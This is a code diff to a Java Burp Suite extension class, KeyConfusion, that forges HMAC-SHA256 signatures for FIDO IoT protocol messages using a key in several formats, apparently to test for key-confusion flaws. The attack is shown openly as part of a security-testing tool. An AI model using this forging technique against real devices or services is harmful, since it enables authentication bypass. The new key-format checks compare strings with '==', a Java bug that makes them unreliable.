@@ -6,6 +6,7 @@ import burp.IHttpRequestResponse;
 import burp.IRequestInfo;
 import burp.IResponseInfo;
 import src.main.eu.devity.burp.fidoiot.utilities.Logger;
+import src.main.eu.devity.burp.fidoiot.utilities.SignatureFn;
 import burp.IHttpService;
 import java.io.PrintWriter;
 import java.math.BigInteger;
@@ -28,6 +29,7 @@ public class KeyConfusion {
   private static final Logger loggerInstance = Logger.getInstance();
   private byte[] updateMessage;
   AttackExecutor attackRequestExecutor;
+  private SignatureFn signatureFn;
 
     public KeyConfusion(IBurpExtenderCallbacks callbacks, IHttpRequestResponse message){
         this.callbacks = callbacks;
@@ -35,9 +37,10 @@ public class KeyConfusion {
         this.requestResponse = message;
         this.requestInfo = helpers.analyzeRequest(message);
         this.httpService = message.getHttpService();
+        signatureFn = new SignatureFn();
     }
 
-    public byte[] autoAttack(String privKey, String messageBody, boolean proxyVal, String proxyDNS, int proxyPort){
+    public byte[] autoAttack(String privKey, String messageBody, boolean proxyVal, String proxyDNS, int proxyPort, String keyFormat){
 
       List<String> headers = requestInfo.getHeaders();
       Integer msgType = 0;
@@ -57,8 +60,17 @@ public class KeyConfusion {
        }
        
       String signingStr = getBody(messageBody);
+      String pubKey = privKey;
+      if(keyFormat == "PEM"){
+        // original pem format message
+        pubKey = privKey;
+    } else if(keyFormat == "String") {
+        pubKey = signatureFn.keyStringFormat(privKey);
+    } else if(keyFormat == "NoHeadFoot") {
+        pubKey = signatureFn.keyNoHeadFootFormat(privKey);
+    }
 
-      byte[] tempHmac =  hmac256SHAgen(privKey.getBytes(), signingStr.getBytes());
+      byte[] tempHmac =  signatureFn.hmac256SHAgen(pubKey.getBytes(), signingStr.getBytes(), "HmacSHA256");
       String signature = Base64.getEncoder().encodeToString(tempHmac); // passed as sg value
       byte[] decoded = Base64.getDecoder().decode(signature);
       String temp1 = String.format("%040x", new BigInteger(1, decoded)); // to calculate length
@@ -79,7 +91,6 @@ public class KeyConfusion {
             this.httpService = helpers.buildHttpService(proxyDNS,proxyPort,this.httpService.getProtocol());
         }
         updateMessage = helpers.buildHttpMessage(headers, newStr.getBytes());
-        // this.sendAttackReq();
 
         return updateMessage;
 
@@ -90,21 +101,6 @@ public class KeyConfusion {
       attackRequestExecutor = new AttackExecutor(updateMessage);
       attackRequestExecutor.execute();
   }
-
-    public byte[] hmac256SHAgen(byte[] secretKey, byte[] message){
-      byte[] hmacSha256 = null;
-      try {
-        Mac mac = Mac.getInstance("HmacSHA256");
-        SecretKeySpec secretKeySpec = new SecretKeySpec(secretKey, "HmacSHA256");
-        mac.init(secretKeySpec);
-        hmacSha256 = mac.doFinal(message);
-        return hmacSha256;
-      } catch (Exception e) {
-        throw new RuntimeException("Failed to calculate hmac-sha256", e);
-        
-      }
-    }
-
 
     private String getBody(String bodyTxt) {
       int tempbod =  bodyTxt.indexOf("\"bo\""); // there are two bo
